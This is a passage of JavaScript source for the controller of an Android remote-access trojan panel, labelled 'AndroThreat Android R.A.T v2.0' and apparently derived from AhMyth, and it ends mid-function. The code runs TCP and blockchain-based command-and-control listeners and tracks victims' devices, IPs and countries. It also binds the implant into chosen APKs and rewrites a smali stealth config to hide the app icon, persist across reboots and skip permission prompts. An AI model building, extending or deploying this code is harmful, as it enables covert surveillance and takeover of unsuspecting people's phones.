    $appCtrl.testProcess = null;

    // Refresh ADB devices
    $appCtrl.refreshDevices = async () => {
        try {
            const { exec } = require('child_process');
            const { promisify } = require('util');
            const execAsync = promisify(exec);
            
            const { stdout } = await execAsync('adb devices');
            const lines = stdout.split('\n').filter(l => l.trim() && !l.includes('List of devices'));
            const devices = [];
            
            for (const line of lines) {
                const parts = line.trim().split(/\s+/);
                if (parts.length >= 2 && parts[1] === 'device') {
                    const deviceId = parts[0];
                    // Try to get device model
                    try {
                        const { stdout: model } = await execAsync(`adb -s ${deviceId} shell getprop ro.product.model`).catch(() => ({ stdout: 'Unknown' }));
                        const { stdout: android } = await execAsync(`adb -s ${deviceId} shell getprop ro.build.version.release`).catch(() => ({ stdout: 'Unknown' }));
                        devices.push({
                            id: deviceId,
                            name: `${model.toString().trim()} (Android ${android.toString().trim()})`
                        });
                    } catch (e) {
                        devices.push({
                            id: deviceId,
                            name: deviceId
                        });
                    }
                }
            }
            
            $appCtrl.availableDevices = devices;
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        } catch (e) {
            console.error('Error refreshing devices:', e);
            $appCtrl.addOutput('Error refreshing devices: ' + e.message, 'error');
        }
    };

    // Add output line (strips ANSI codes for cleaner display) and track chunk status separately
    const stripAnsi = (str) => (str || '').replace(/\u001b\[[0-9;]*m/g, '');
    $appCtrl.chunkLogs = [];
    $appCtrl.addOutput = (content, type = 'info') => {
        const time = new Date().toLocaleTimeString();
        const clean = stripAnsi(content);
        // Detect chunk-related lines and store separately
        if (/chunk/i.test(clean) || /Chunk \d+\/\d+/i.test(clean)) {
            $appCtrl.chunkLogs.push({ time, content: clean, type: 'info' });
            if ($appCtrl.chunkLogs.length > 100) $appCtrl.chunkLogs.shift();
        }
        $appCtrl.outputLines.push({ time, content: clean, type });
        // Keep only last 1000 lines
        if ($appCtrl.outputLines.length > 1000) {
            $appCtrl.outputLines.shift();
        }
        // Auto-scroll to bottom
        setTimeout(() => {
            const outputEl = document.getElementById('testOutput');
            if (outputEl) {
                outputEl.scrollTop = outputEl.scrollHeight;
            }
        }, 100);
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };

    // Clear output
    $appCtrl.clearOutput = () => {
        $appCtrl.outputLines = [];
        $appCtrl.testResults = [];
        $appCtrl.testStats = { total: 0, passed: 0, failed: 0 };
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };

    // Start tests
    $appCtrl.startTests = () => {
        if ($appCtrl.isRunning) return;
        
        $appCtrl.isRunning = true;
        $appCtrl.clearOutput();
        $appCtrl.addOutput('Starting comprehensive test suite...', 'info');
        
        // Send IPC message to main process
        ipcRenderer.send('test-suite:start', $appCtrl.testConfig);
    };

    // Stop tests
    $appCtrl.stopTests = () => {
        if (!$appCtrl.isRunning) return;
        
        $appCtrl.addOutput('Stopping tests...', 'warn');
        ipcRenderer.send('test-suite:stop');
    };

    // Listen for test output from main process
    ipcRenderer.on('test-suite:output', (event, data) => {
        $appCtrl.addOutput(data.message, data.type || 'info');
    });

    // Listen for test result
    ipcRenderer.on('test-suite:result', (event, result) => {
        $appCtrl.testResults.push(result);
        if (result.success) {
            $appCtrl.testStats.passed++;
        } else {
            $appCtrl.testStats.failed++;
        }
        $appCtrl.testStats.total = $appCtrl.testResults.length;
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Listen for stats updates
    ipcRenderer.on('test-suite:stats', (event, stats) => {
        if (stats && typeof stats.total === 'number') {
            $appCtrl.testStats.total = stats.total;
            $appCtrl.testStats.passed = stats.passed || 0;
            $appCtrl.testStats.failed = stats.failed || 0;
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        }
    });

    // Listen for completion
    ipcRenderer.on('test-suite:complete', (event, stats) => {
        if (stats && typeof stats.total === 'number') {
            $appCtrl.testStats.total = stats.total;
            $appCtrl.testStats.passed = stats.passed || 0;
            $appCtrl.testStats.failed = stats.failed || 0;
            const summaryType = stats.failed > 0 ? 'error' : 'success';
            $appCtrl.addOutput(`Test suite completed. Total: ${stats.total}, Passed: ${stats.passed}, Failed: ${stats.failed}`, summaryType);
        }
        $appCtrl.isRunning = false;
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Listen for test statistics update
    ipcRenderer.on('test-suite:stats', (event, stats) => {
        $appCtrl.testStats = stats;
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Listen for test completion
    ipcRenderer.on('test-suite:complete', (event, stats) => {
        $appCtrl.isRunning = false;
        if (stats && stats.total > 0) {
            $appCtrl.testStats = stats;
        }
        $appCtrl.addOutput(`\nTest suite completed. Total: ${$appCtrl.testStats.total}, Passed: ${$appCtrl.testStats.passed}, Failed: ${$appCtrl.testStats.failed}`, 
                          $appCtrl.testStats.failed === 0 ? 'success' : 'error');
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Listen for test error
    ipcRenderer.on('test-suite:error', (event, error) => {
        $appCtrl.isRunning = false;
        $appCtrl.addOutput('Error: ' + error.message, 'error');
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Initialize devices on load
    setTimeout(() => {
        $appCtrl.refreshDevices();
    }, 1000);

    // ========== REQUEST/RESPONSE LOGS CONTROLLER ==========
    $appCtrl.requestLogs = [];
    $appCtrl.autoScrollLogs = true;
    $appCtrl.logFilters = {
        request: true,
        response: true,
        info: true,
        error: true
    };
    
    // Log filter function
    $appCtrl.logFilter = (log) => {
        return $appCtrl.logFilters[log.type] !== false;
    };
    
    // Get log count by type
    $appCtrl.getLogCount = (type) => {
        return $appCtrl.requestLogs.filter(l => l.type === type).length;
    };
    
    // Clear request logs
    $appCtrl.clearRequestLogs = () => {
        $appCtrl.requestLogs = [];
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };
    
    // Toggle auto-scroll
    $appCtrl.toggleAutoScroll = () => {
        $appCtrl.autoScrollLogs = !$appCtrl.autoScrollLogs;
        if ($appCtrl.autoScrollLogs) {
            $appCtrl.scrollLogsToBottom();
        }
    };
    
    // Apply log filters
    $appCtrl.applyLogFilters = () => {
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };
    
    // Toggle log data expansion
    $appCtrl.toggleLogData = (index) => {
        if ($appCtrl.requestLogs[index]) {
            $appCtrl.requestLogs[index].expanded = !$appCtrl.requestLogs[index].expanded;
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        }
    };
    
    // Scroll logs to bottom
    $appCtrl.scrollLogsToBottom = () => {
        setTimeout(() => {
            const logsContent = document.getElementById('logsContent');
            if (logsContent) {
                logsContent.scrollTop = logsContent.scrollHeight;
            }
        }, 100);
    };
    
    // Add log entry
    $appCtrl.addRequestLog = (logEntry) => {
        const time = new Date().toLocaleTimeString();
        $appCtrl.requestLogs.push({
            time: time,
            type: logEntry.type || 'info',
            deviceId: logEntry.deviceId || '',
            command: logEntry.command || '',
            data: logEntry.data || '',
            expanded: false
        });
        
        // Keep only last 1000 entries
        if ($appCtrl.requestLogs.length > 1000) {
            $appCtrl.requestLogs.shift();
        }
        
        // Auto-scroll if enabled
        if ($appCtrl.autoScrollLogs) {
            $appCtrl.scrollLogsToBottom();
        }
        
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };
    
    // Listen for log events from main process
    ipcRenderer.on('log:request', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'request',
            deviceId: data.deviceId,
            command: data.command,
            data: data.data ? JSON.stringify(data.data, null, 2) : ''
        });
    });
    
    ipcRenderer.on('log:response', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'response',
            deviceId: data.deviceId,
            command: data.command,
            data: data.data ? JSON.stringify(data.data, null, 2) : ''
        });
    });
    
    ipcRenderer.on('log:info', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'info',
            deviceId: '',
            command: '',
            data: data.message || ''
        });
    });
    
    ipcRenderer.on('log:error', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'error',
            deviceId: '',
            command: '',
            data: data.message || ''
        });
    });

    // Convert country code to flag image (works on all OS including Windows)
    $appCtrl.getCountryFlag = (countryCode) => {
        const flag = countryCodeToFlag(countryCode);
        if (flag.type === 'icon') {
            // Use Semantic UI icon for special cases
            return $sce.trustAsHtml(`<span class="country-flag" title="${flag.title}"><i class="${flag.value} icon"></i></span>`);
        } else {
            // Use actual flag image from CDN
            return $sce.trustAsHtml(`<img class="country-flag-img" src="${flag.value}" srcset="${flag.value2x} 2x" alt="${flag.title}" title="${flag.title}" style="width:24px;height:18px;vertical-align:middle;border-radius:2px;box-shadow:0 1px 3px rgba(0,0,0,0.3);">`);
        }
    };

    // Wait for DOM to be ready and initialize UI components
    var initUI = () => {
        var log = document.getElementById("log");
        if (!log) {
            console.error("[AhMyth] Log element not found! Retrying...");
            setTimeout(initUI, 100);
            return;
        }
        console.log("[AhMyth] Log element found, UI initialized");

        try {
            if (typeof $ !== 'undefined') {
                $('.menu .item').tab();
                $('.ui.dropdown').dropdown();
            }
        } catch (e) {
            console.error("[AhMyth] Error initializing UI components:", e);
        }
    };
    
    // Try multiple times to ensure DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initUI);
    } else {
        setTimeout(initUI, 50);
    }

    // Handle remote module with fallback
    let electronWindow;
    try {
        electronWindow = remote.getCurrentWindow();
    } catch (e) {
        console.error("[AhMyth] Remote module not available:", e);
        // Fallback: use IPC to communicate with main process
        electronWindow = null;
    }

    $appCtrl.close = () => {
        // Always fire IPC so main handles even if remote fails
        if (ipcRenderer && ipcRenderer.send) {
            ipcRenderer.send('window-close');
        }
        if (electronWindow && !electronWindow.isDestroyed()) {
            electronWindow.close();
        }
    };

    $appCtrl.minimize = () => {
        if (ipcRenderer && ipcRenderer.send) {
            ipcRenderer.send('window-minimize');
        }
        if (electronWindow && !electronWindow.isDestroyed()) {
            electronWindow.minimize();
        }
    };

    $appCtrl.maximize = () => {
        if (ipcRenderer && ipcRenderer.send) {
            ipcRenderer.send('window-maximize');
        }
        if (electronWindow && !electronWindow.isDestroyed()) {
            if (electronWindow.isMaximized()) {
                electronWindow.unmaximize(); // Restore the window size
            } else {
                electronWindow.maximize(); // Maximize the window
            }
        }
    };

    // TCP/IP listener
    $appCtrl.ListenTCP = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }
        $appCtrl.Log(`[→] Initiating TCP/IP server on port ${port}...`, CONSTANTS.logStatus.INFO);
        ipcRenderer.send("SocketIO:Listen", port);
    };

    // Blockchain listener
    $appCtrl.ListenBlockchain = () => {
        const channelAddr = $appCtrl.blockchainContract || $appCtrl.blockchainC2Contract;
        const aesKey = $appCtrl.builder.blockchainC2AesKey;
        const rpcUrl = $appCtrl.builder.blockchainRpcUrl;
        const rpcFallbacks = $appCtrl.builder.blockchainRpcFallbacks;
        
        if (channelAddr && aesKey) {
            $appCtrl.Log(`[→] Starting blockchain C2 listener...`, CONSTANTS.logStatus.INFO);
            ipcRenderer.send("Blockchain:Listen", {
                channelAddress: channelAddr,
                aesKey: aesKey,
                rpcUrl: rpcUrl || 'https://api.devnet.solana.com',
                rpcFallbacks: rpcFallbacks || ''
            });
        } else {
            $appCtrl.Log(`[ℹ] Blockchain C2 not fully configured (need channel address and AES key)`, CONSTANTS.logStatus.INFO);
        }
    };

    $appCtrl.StopListening = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }
        $appCtrl.Log(`[→] Stopping server on port ${port}...`, CONSTANTS.logStatus.INFO);
        ipcRenderer.send("SocketIO:Stop", port);
        
        // Also stop blockchain listener
        ipcRenderer.send("Blockchain:Stop");
    };

    ipcRenderer.on("SocketIO:Listen", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.Log(`[ℹ] Server is now accepting connections`, CONSTANTS.logStatus.INFO);
        $appCtrl.isListen = true;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("SocketIO:Stop", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.Log(`[ℹ] All connections have been terminated`, CONSTANTS.logStatus.INFO);
        $appCtrl.isListen = false;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        try {
            if (victimsList) {
                const victim = victimsList.getVictim(index);
                // getVictim returns -1 if not found - don't add invalid victims
                if (victim && victim !== -1) {
                    markBlockchainCountry(victim);
                    viclist[index] = victim;
                    const status = victim.isOnline ? 'connected' : 'offline (restored)';
                    const connType = victim.ip === 'Blockchain' ? 'blockchain' : 'tcp';
                    $appCtrl.Log(`[✓] Victim ${status}! (${connType})`, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log(`    ├─ IP: ${victim.ip}:${victim.port}`, CONSTANTS.logStatus.INFO);
                    $appCtrl.Log(`    ├─ Device: ${victim.manf || 'Unknown'} ${victim.model || 'Unknown'}`, CONSTANTS.logStatus.INFO);
                    $appCtrl.Log(`    ├─ Android: ${victim.release || 'Unknown'}`, CONSTANTS.logStatus.INFO);
                    $appCtrl.Log(`    └─ Country: ${victim.country ? victim.country.toUpperCase() : 'Unknown'}`, CONSTANTS.logStatus.INFO);
                } else {
                    console.warn(`[AhMyth] Victim not found for index: ${index}`);
                }
            }
        } catch (e) {
            console.error("[AhMyth] Error getting victim:", e);
            $appCtrl.Log(`[✗] Error retrieving victim data: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    // Restore offline victims on startup
    ipcRenderer.on('Victims:RestoreOffline', (event, offlineVictims) => {
        try {
            if (!offlineVictims || !Array.isArray(offlineVictims)) return;
            
            let restoredCount = 0;
            offlineVictims.forEach(({ id, victim }) => {
                try {
                    // Find an available index or use ID-based index
                    let index = parseInt(id.substring(0, 8), 16) % 100000;
                    // Ensure index doesn't conflict
                    while (viclist[index] && viclist[index].id !== id) {
                        index = (index + 1) % 100000;
                    }
                    
                    // Add to viclist
                    markBlockchainCountry(victim);
                    viclist[index] = victim;
                    restoredCount++;
                } catch (e) {
                    console.error(`[AhMyth] Error restoring victim ${id}:`, e);
                }
            });
            
            if (restoredCount > 0) {
                $appCtrl.Log(`[ℹ] Restored ${restoredCount} offline victim(s) from previous session`, CONSTANTS.logStatus.INFO);
            }
        } catch (e) {
            console.error("[AhMyth] Error restoring offline victims:", e);
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("SocketIO:ListenError", (event, error) => {
        $appCtrl.Log(`[✗] Server Error: ${error}`, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("SocketIO:StopError", (event, error) => {
        $appCtrl.Log(`[✗] Stop Error: ${error}`, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
    });

    // Blockchain listener events
    ipcRenderer.on("Blockchain:Listen", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.blockchainListening = true;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("Blockchain:Stop", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.blockchainListening = false;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("Blockchain:ListenError", (event, error) => {
        $appCtrl.Log(`[✗] Blockchain Error: ${error}`, CONSTANTS.logStatus.FAIL);
        $appCtrl.blockchainListening = false;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("Blockchain:Log", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.INFO);
        // Also append to blockchain logs tab
        $appCtrl.appendBlockchainLog(message);
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        if (viclist[index]) {
            const victim = viclist[index];
            $appCtrl.Log(`[⚠] Victim disconnected: ${victim.ip} (${victim.manf} ${victim.model})`, CONSTANTS.logStatus.WARNING);
        }
        delete viclist[index];
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    // Handle victim going offline (keep in list)
    ipcRenderer.on('SocketIO:VictimOffline', (event, index) => {
        // Handle both index (number) and clientId (string) formats
        const victim = viclist[index] || (victimsList && victimsList.getVictim(index));
        if (victim && victim !== -1) {
            victim.isOnline = false;
            victim.lastSeen = Date.now();
            // Update viclist if using clientId
            if (!viclist[index] && victimsList) {
                const allVictims = victimsList.getAllVictims();
                for (const [id, v] of Object.entries(allVictims)) {
                    if (id === index || v.id === index) {
                        viclist[id] = v;
                        break;
                    }
                }
            }
            $appCtrl.Log(`[⚠] Victim went offline: ${victim.ip || victim.walletAddress || index} (${victim.manf || ''} ${victim.model || ''})`, CONSTANTS.logStatus.WARNING);
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });
    
    ipcRenderer.on('SocketIO:VictimOnline', (event, index) => {
        // Handle both index (number) and clientId (string) formats
        const victim = viclist[index] || (victimsList && victimsList.getVictim(index));
        if (victim && victim !== -1) {
            victim.isOnline = true;
            victim.lastSeen = Date.now();
            // Update viclist if using clientId
            if (!viclist[index] && victimsList) {
                const allVictims = victimsList.getAllVictims();
                for (const [id, v] of Object.entries(allVictims)) {
                    if (id === index || v.id === index) {
                        viclist[id] = v;
                        break;
                    }
                }
            }
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    // Handle victim data update (from blockchain heartbeat updates)
    ipcRenderer.on('SocketIO:VictimUpdate', (event, index) => {
        if (victimsList) {
            const victim = victimsList.getVictim(index);
            if (victim && victim !== -1) {
                // Update the viclist entry with fresh data
                markBlockchainCountry(victim);
                viclist[index] = victim;
            }
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    // Handle live battery updates
    ipcRenderer.on('SocketIO:BatteryUpdate', (event, data) => {
        if (viclist[data.id]) {
            viclist[data.id].battery = data.battery;
            if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
                $appCtrl.$apply();
            }
        }
    });

    // Remove victim permanently
    $appCtrl.removeVictim = (index) => {
        if (viclist[index]) {
            const victim = viclist[index];
            $appCtrl.Log(`[✗] Removed victim: ${victim.ip} (${victim.manf} ${victim.model})`, CONSTANTS.logStatus.INFO);
            delete viclist[index];
            if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
                $appCtrl.$apply();
            }
        }
    };

    $appCtrl.openLab = (index) => {
        if (!viclist[index] || !viclist[index].isOnline) {
            $appCtrl.Log(`[✗] Cannot open lab - victim is offline`, CONSTANTS.logStatus.FAIL);
            return;
        }
        $appCtrl.Log(`[→] Opening lab for victim: ${viclist[index].ip}`, CONSTANTS.logStatus.INFO);
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    };
    
    // Function to open folder/file in system file manager
    $appCtrl.openPath = (filePath) => {
        if (!shell) {
            $appCtrl.Log('[✗] Cannot open path: shell module not available', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        try {
            // Check if it's a file or folder
            const fs = require('fs-extra');
            const path = require('path');
            
            // Normalize the path
            let normalizedPath = filePath.trim();
            
            // If it's a file, open the containing folder and select the file
            if (fs.existsSync(normalizedPath)) {
                const stats = fs.statSync(normalizedPath);
                if (stats.isFile()) {
                    // Open folder and select file (Windows/Linux/Mac)
                    shell.showItemInFolder(normalizedPath);
                } else {
                    // It's a directory, just open it
                    shell.openPath(normalizedPath);
                }
                $appCtrl.Log(`[✓] Opened: ${normalizedPath}`, CONSTANTS.logStatus.SUCCESS);
            } else {
                // Path doesn't exist, try to open parent directory
                const parentDir = path.dirname(normalizedPath);
                if (fs.existsSync(parentDir)) {
                    shell.openPath(parentDir);
                    $appCtrl.Log(`[ℹ] Opened parent folder: ${parentDir}`, CONSTANTS.logStatus.INFO);
                } else {
                    $appCtrl.Log(`[✗] Path not found: ${normalizedPath}`, CONSTANTS.logStatus.FAIL);
                }
            }
        } catch (error) {
            $appCtrl.Log(`[✗] Error opening path: ${error.message}`, CONSTANTS.logStatus.FAIL);
        }
    };


    // Enhanced logging with detailed timestamps and levels
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        var levelPrefix = '';
        
        if (status == CONSTANTS.logStatus.SUCCESS) {
            fontColor = CONSTANTS.logColors.GREEN;
            levelPrefix = 'SUCCESS';
        } else if (status == CONSTANTS.logStatus.FAIL) {
            fontColor = CONSTANTS.logColors.RED;
            levelPrefix = 'ERROR';
        } else if (status == CONSTANTS.logStatus.INFO) {
            fontColor = CONSTANTS.logColors.YELLOW;
            levelPrefix = 'INFO';
        } else if (status == CONSTANTS.logStatus.WARNING) {
            fontColor = CONSTANTS.logColors.ORANGE;
            levelPrefix = 'WARNING';
        } else {
            levelPrefix = 'LOG';
        }

        const now = new Date();
        const timestamp = now.toLocaleString('en-US', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });

        // Check if message contains a file path and make it clickable
        let clickablePath = null;
        let displayMsg = msg;
        
        // Detect file paths in the message (paths that start with └─ or contain drive letters or /)
        // Match paths like: C:\path\to\file, /path/to/file, or paths after └─
        const pathMatch = msg.match(/(?:└─\s*)?([A-Z]:[\\\/](?:[^\s<>"']+[\\\/])*[^\s<>"']+|(?:[\\\/][^\s<>"']+)+)/);
        if (pathMatch && pathMatch[1]) {
            clickablePath = pathMatch[1].trim();
            // Escape HTML and create clickable link
            const escapedPath = clickablePath.replace(/"/g, '&quot;').replace(/'/g, '&#39;');
            displayMsg = msg.replace(clickablePath, `<a href="#" class="log-path-link" data-path="${escapedPath}" onclick="return false;">${clickablePath}</a>`);
        }
        
        $appCtrl.logs.push({
            date: `[${timestamp}]`,
            msg: msg,
            displayMsg: displayMsg,
            clickablePath: clickablePath,
            isHtml: clickablePath !== null,
            color: fontColor,
            level: levelPrefix
        });
        
        // Ensure log element exists before scrolling
        setTimeout(() => {
            var log = document.getElementById("log");
            if (log) {
                const logContent = log.querySelector('.log-content');
                if (logContent) {
                    // Only auto-scroll if user is at the bottom or within 50px of the bottom
                    const scrollThreshold = 50; // px
                    const isAtBottom = logContent.scrollHeight - logContent.scrollTop <= logContent.clientHeight + scrollThreshold;
                    
                    if (isAtBottom) {
                        logContent.scrollTop = logContent.scrollHeight;
                    }
                } else {
                    // Fallback for older structure, still apply threshold
                    const scrollThreshold = 50; // px
                    const isAtBottom = log.scrollHeight - log.scrollTop <= log.clientHeight + scrollThreshold;
                    if (isAtBottom) {
                        log.scrollTop = log.scrollHeight;
                    }
                }
            }
        }, 0);
        
        if (!$appCtrl.$$phase) {
            $appCtrl.$apply();
        }
    }

    // function to clear the logs each time a button is clicked,
    // this is done to keep things clean.
    $appCtrl.clearLogs = () => {
        if ($appCtrl.logs.length !== 0) {
            $appCtrl.logs = [];
        }
        $appCtrl.Log('[ℹ] Console cleared', CONSTANTS.logStatus.INFO);
        setTimeout(() => {
            const logContent = document.querySelector('.log-content');
            if (logContent) logContent.scrollTop = 0;
        }, 50);
    }

    // Initial welcome messages
    const architecture = process.arch;
    if (architecture === 'ia32') {
        delayedLog('[⚠] WARNING: AndroThreat will cease support for 32-bit systems when Apktool reaches v3.0.0', CONSTANTS.logStatus.WARNING);
    } else {
        delayedLog('╔════════════════════════════════════════════════════════════╗', CONSTANTS.logStatus.SUCCESS);
        delayedLog('║       Welcome to AndroThreat Android R.A.T v2.0                 ║', CONSTANTS.logStatus.SUCCESS);
        delayedLog('║       Modern Edition with Enhanced Features                ║', CONSTANTS.logStatus.SUCCESS);
        delayedLog('╚════════════════════════════════════════════════════════════╝', CONSTANTS.logStatus.SUCCESS);
        delayedLog('');
        delayedLog('[ℹ] System initialized successfully', CONSTANTS.logStatus.INFO);
        delayedLog('[ℹ] Ready to start server and accept connections', CONSTANTS.logStatus.INFO);
    }

    //function to open the dialog and choose apk to be bound
    $appCtrl.BrowseApk = () => {
        if (!dialog) {
            $appCtrl.Log('[✗] Dialog module not available', CONSTANTS.logStatus.FAIL);
            return;
        }
        dialog.showOpenDialog({
            properties: ['openFile'],
            title: 'Choose APK to bind',
            buttonLabel: 'Select APK',
            filters: [{
                name: 'Android APK', extensions: ['apk']
            } //only select apk files
            ]
        }).then(result => {
            if (result.canceled) {
                $appCtrl.Log('[ℹ] APK selection cancelled', CONSTANTS.logStatus.INFO);
            } else {
                var apkName = result.filePaths[0].replace(/\\/g, "/").split('/').pop();
                $appCtrl.Log(`[✓] APK selected: "${apkName}"`, CONSTANTS.logStatus.SUCCESS);
                readFile(result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log('[✗] Failed to open file dialog', CONSTANTS.logStatus.FAIL);
        })

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }
    }

    // Function to apply stealth and permission options to StealthConfig.smali
    async function applyStealthConfigToSmali(apkFolder) {
        const stealthConfigPaths = [
            dir.join(apkFolder, 'smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali'),
            dir.join(apkFolder, 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali'),
            dir.join(apkFolder, 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali')
        ];
        
        let stealthConfigPath = null;
        for (const path of stealthConfigPaths) {
            if (fs.existsSync(path)) {
                stealthConfigPath = path;
                break;
            }
        }
        
        if (!stealthConfigPath) {
            delayedLog('[⚠] StealthConfig.smali not found, skipping stealth config modification', CONSTANTS.logStatus.WARNING);
            return;
        }
        
        try {
            delayedLog('[→] Modifying StealthConfig.smali...', CONSTANTS.logStatus.INFO);
            let smaliContent = await fs.promises.readFile(stealthConfigPath, 'utf8');
            
            // Map GUI options to StealthConfig fields
            const stealthMappings = {
                'HIDE_ICON': $appCtrl.stealthOptions?.hideIcon ?? true,
                'HIDE_FROM_RECENTS': $appCtrl.stealthOptions?.hideFromRecents ?? false,
                'START_ON_BOOT': $appCtrl.stealthOptions?.startOnBoot ?? true,
                'SILENT_NOTIFICATION': $appCtrl.stealthOptions?.silentNotification ?? false,
                'PERSISTENT_SERVICE': $appCtrl.stealthOptions?.persistentService ?? true,
                'WAKE_LOCK': $appCtrl.stealthOptions?.wakelock ?? true,
                'AUTO_CLOSE_ACTIVITY': false, // Default to false for better UX
                'UNINSTALL_PROTECTION': false, // Default to false
                'SKIP_PERMISSION_PROMPTS': $appCtrl.silentPermOptions?.skipPrompts ?? false,
                'USE_ACCESSIBILITY_GRANTER': $appCtrl.silentPermOptions?.useAccessibility ?? false,
                'DEVICE_OWNER_MODE': $appCtrl.silentPermOptions?.deviceOwner ?? false,
                'ADB_GRANT_MODE': $appCtrl.silentPermOptions?.generateAdbScript ?? true,
                'SKIP_SPECIAL_PERMISSIONS': false,
                'MINIMAL_PERMISSIONS_ONLY': false,
                'SILENT_PERMISSION_MODE': $appCtrl.silentPermOptions?.skipPrompts ?? false,
                'SKIP_SCREEN_CAPTURE_PROMPT': true,
                'AUTO_REQUEST_SCREEN_CAPTURE': false
            };
            
            let modifiedCount = 0;
            
            // Replace boolean values in smali format
            for (const [fieldName, value] of Object.entries(stealthMappings)) {
                const boolValue = value ? '0x1' : '0x0';
                const boolStr = value ? 'true' : 'false';
                let found = false;
                
                // Pattern 1: Replace in .field declaration with = true/false (direct assignment)
                const fieldPattern = new RegExp(`(\\.field public static final ${fieldName}:Z\\s*=\\s*)(true|false)`, 'g');
                if (fieldPattern.test(smaliContent)) {
                    smaliContent = smaliContent.replace(fieldPattern, `$1${boolStr}`);
                    found = true;
                    modifiedCount++;
                    delayedLog(`[✓] Set ${fieldName} = ${boolStr}`, CONSTANTS.logStatus.SUCCESS);
                    continue;
                }
                
                // Pattern 2: Replace in <clinit> method - find const/4 before sput-boolean
                // Look for: const/4 vX, 0x0 or 0x1 followed by sput-boolean for this field
                const lines = smaliContent.split('\n');
                let inClinit = false;
                let clinitStart = -1;
                let clinitEnd = -1;
                
                // Find <clinit> method boundaries
                for (let i = 0; i < lines.length; i++) {
                    if (lines[i].trim().startsWith('.method static constructor <clinit>()V')) {
                        inClinit = true;
                        clinitStart = i;
                    }
                    if (inClinit && lines[i].trim() === '.end method') {
                        clinitEnd = i;
                        break;
                    }
                }
                
                if (inClinit && clinitStart >= 0 && clinitEnd > clinitStart) {
                    // Search within <clinit> for this field's assignment
                    for (let i = clinitStart; i <= clinitEnd; i++) {
                        // Look for sput-boolean with this field name
                        if (lines[i].includes(`->${fieldName}:Z`)) {
                            // Look backwards for const/4 instruction
                            for (let j = i - 1; j >= clinitStart && j >= i - 5; j--) {
                                const line = lines[j].trim();
                                if (line.startsWith('const/4') && (line.includes('0x0') || line.includes('0x1'))) {
                                    // Replace the const value
                                    lines[j] = lines[j].replace(/0x[01]/g, boolValue);
                                    found = true;
                                    modifiedCount++;
                                    delayedLog(`[✓] Set ${fieldName} = ${boolStr} (in <clinit>)`, CONSTANTS.logStatus.SUCCESS);
